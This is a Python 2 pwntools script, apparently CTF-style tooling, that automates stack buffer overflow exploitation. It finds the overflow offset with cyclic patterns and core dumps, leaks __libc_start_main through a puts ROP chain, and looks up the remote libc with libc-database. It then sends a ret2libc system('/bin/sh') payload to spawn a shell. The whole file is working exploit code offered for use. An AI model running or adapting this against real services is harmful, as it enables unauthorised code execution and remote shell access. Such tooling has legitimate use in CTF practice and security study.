from pwn import *
import re, os, sys, subprocess, pwnlib, binascii

global config, remlib


def init(confi):
    global config,buffer,toolpa,rop,e
    context.log_level = "WARNING"
    logGen = log.progress("Stage 1", level=31)
    logGen.status("Booting Up....")
    config = confi
    context.binary = config._elf
    #context.log_level="DEBUG"
    e = config._elf
    rop = ROP(e)
    toolpa = config._toolpa
    logGen.success("Finished!")
    buf=Buff()
    buflen=buf.finder()
    buffer=buflen*"A"
    return True


def recvleak(rm):  # TODO recv\n ?
    return u(rm.recvline().strip().ljust(context.bytes, "\x00")), rm


def midroll(rm):
    return config.midroll(rm)


def postroll(rm):
    return config.postroll(rm)


def preroll(rm):
    return config.preroll(rm)


def fingad(gadlis):
    return p(rop.find_gadget(gadlis)[0])


def fplt(sym):
    return p(e.plt[sym])


def fsym(sym):
    return p(e.symbols[sym])


def fgot(sym):
    return p(e.got[sym])


def p(x):
    return pack(x)


def u(x):
    return unpack(x)


def escape_ansi(lin):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', lin)


class OffGet:
    def __init__(self, lib, libcmain):  # lib is id if rem else libcobject
        if remlib:
            # print hex(libcmain)
            os.system(toolpa + "libcdb/dump " + lib + " > offsets")
            os.system(toolpa + "libcdb/dump " + lib + " __libc_start_main >> offsets")
            os.system(toolpa + "libcdb/dump " + lib + " exit >> offsets")
            off = open("offsets", "r")
            offsets = off.read()
            off.close()  # TODO slicer method
            self.offset___libc_start_main_ret = int((offsets.split("\n")[0]).split(" = ")[1], 0)
            self.offset_system = int((offsets.split("\n")[1]).split(" = ")[1], 0)
            self.offset_dup2 = int((offsets.split("\n")[2]).split(" = ")[1], 0)
            self.offset_read = int((offsets.split("\n")[3]).split(" = ")[1], 0)
            self.offset_write = int((offsets.split("\n")[4]).split(" = ")[1], 0)
            self.offset_str_bin_sh = int((offsets.split("\n")[5]).split(" = ")[1], 0)
            self.offset__libc_start_main = int((offsets.split("\n")[6]).split(" = ")[1], 0)
            self.offset_exit = int((offsets.split("\n")[7]).split(" = ")[1], 0)
            self.libcbase = libcmain - self.offset__libc_start_main
            self.BINSH = self.libcbase + self.offset_str_bin_sh
            self.EXIT = self.libcbase + self.offset_exit
            self.SYSTEM = self.libcbase + self.offset_system
        else:
            self.libcbase = libcmain - lib.sym["__libc_start_main"]
            self.BINSH = next(lib.search("/bin/sh"))  # Verify with find /bin/sh
            self.SYSTEM = lib.sym["system"]
            self.EXIT = lib.sym["exit"]

    def loadBSE(self):
        return p(self.BINSH) + p(self.SYSTEM) + p(self.EXIT)

class libMe:
    def __init__(self):
        self.logGen = log.progress("Stage 3", level=31)
        config._logGen = self.logGen
        self.logGen.status("Ret2Libc Attack!")
        self.symbls = map(str, e.plt)
        self.libMain()
        pass

    def libMain(self):
        global remlib, buffer
        remlib = False
        if config._manuallibc:
            libELF = ELF(config._pathtolibc)
        elif config._LocalOnly:
            libELF = e.libc
        else:
            remlib = True
            liblist = self.libfinder(buffer)
        self.logGen.status("Libc\s found!")
        if remlib:
            for lib in liblist:
                self.logGen.status("Trying now libc " + lib)
                try:
                    self.libPayloader(lib)
                except NameError:
                    self.logGen.success("Bye")
                except:
                    pass
        else:
            try:
                self.logGen.status("Trying now libc " + libELF.path)
                self.libPayloader(libELF)
            except:
                pass
        self.logGen.failure("Nothing worked! Go play some Quake!")
        exit(0)

    def leakloader(self):  # Atomic
        getter = [['pop rdi', 'ret']]
        for gadsym in self.symbls:
            if "puts" == gadsym:
                puts_plt = fplt("puts")
                for gettr in getter:
                    try:
                        getwww = fingad(gettr)
                        libc_start_main = fsym("__libc_start_main")
                        return getwww + libc_start_main + puts_plt, getwww
                    except:
                        print("No " + gettr.join(" "))
                        print "need to implement moar gettr!"
                        exit(0)
                else:
                    print"WWWWOOOPOPOSOPS"
                    print "Need to implement moar leaker(read?)"  # TODO MOAR READ!
                    exit(0)

    def libPayloader(self, lib):
        load, gettr = self.leakloader()
        payload1 = buffer + load + p(e.entry)
        rm = self.libsend(payload1)
        libcmain, rm = recvleak(rm)
        off = OffGet(lib, libcmain)
        load = off.loadBSE()
        payload2 = buffer + gettr + load
        rm = midroll(rm)
        if config._debugfinalPayloadCore:
            config.debugPayload(rm, payload2)
        else:
            config.SnC(rm, payload2)
        self.logGen.status("Sending Payload! Here comes the Shell!")

    def libleaker(self, buff):
        load, dump = self.leakloader()
        payload = buff + load
        libcmain, rm = recvleak(self.libsend(payload))
        return libcmain

    def libsend(self, payload):  # Atomic
        rm = preroll(config._LocalOnly)
        rm.sendline(payload)
        rm = postroll(rm)
        return rm

    def libfinder(self, buff):
        libcmain = self.libleaker(buff)
        global toolpa
        lib = lambda x: (x.split("id ")[1]).split(")")[0]
        os.system(toolpa + "libcdb/find __libc_start_main " + hex(libcmain) + ">libcanal")
        lican = open("libcanal", "r")
        licanal = lican.read().split("\n")
        lenli = len(licanal)
        licanal = licanal[:lenli - 1]
        lican.close()
        liblist = map(lib, licanal)
        return liblist

class Buff:
    def __init__(self):
        self.payroll=config._payroll
        self.UseCore=config._UseCore

    def finder(self):
        self.logBuf = log.progress("Stage 2", level=31)
        if self.UseCore:
            self.logBuf.status("Trying to find Buffer with Coredumps!")
            return self.finderCore()
        else:
            self.logBuf.status("Trying to find Buffer without Coredumps!")
            return self.finderNoCore()

    def finderCore(self):
        try:
            os.remove("./core")
        except:
            pass
        self.logBuf.status("Buffer lenght = "+str(self.payroll))
        while (True):
            pr = preroll(False)
            logBuf.status(str(self.payroll))
            buff = cyclic(self.payroll)
            pr.sendline(buff)
            try:
                context.log_level = "ERROR"
                core = Coredump("./core")
                context.log_level = "WARNING"
            except:
                self.payroll += 100
                continue
            if p(core.fault_addr) not in buff:          #TODO does p instead of p64 work?
                self.payroll += 100
                continue
            else:
                context.log_level = "ERROR"
                tarBufLen = cyclic_find(p(core.fault_addr), n=4)
                context.log_level = "WARNING"
                self.logBuf.success("Finished! Buffer lenght = "+str(tarBufLen) + " Found!")
                return tarBufLen

    def finderNoCore(self):
        while (True):
            pr = preroll(True)
            self.logBuf.status("Buffer lenght = "+str(self.payroll))
            buff = cyclic(self.payroll)
            pr.sendline(buff)
            sleep(0.1)
            if pr.poll() == -11:
                self.logBuf.success("Buffer lenght = "+str(self.payroll+8) + " Found!")
                return (self.payroll + 8)  # TODO Fix hardcoded offset thingy
            else:
                pr.kill()
                pr.close()
                self.payroll += 1